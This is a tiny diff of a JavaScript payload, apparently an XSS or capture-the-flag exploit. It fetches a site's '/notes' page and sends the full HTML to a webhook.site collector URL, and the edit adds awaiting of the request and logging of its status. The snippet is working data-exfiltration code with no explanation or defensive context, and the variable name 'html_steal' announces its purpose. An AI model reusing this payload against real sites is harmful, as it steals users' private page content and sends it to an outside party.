@@ -1,4 +1,4 @@
 const html_steal = await fetch('/notes')
 const html = await html_steal.text();
-fetch('https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6?data='+ html);
-
+const haha = await fetch('https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6?data='+ html);
+console.log(haha.status);
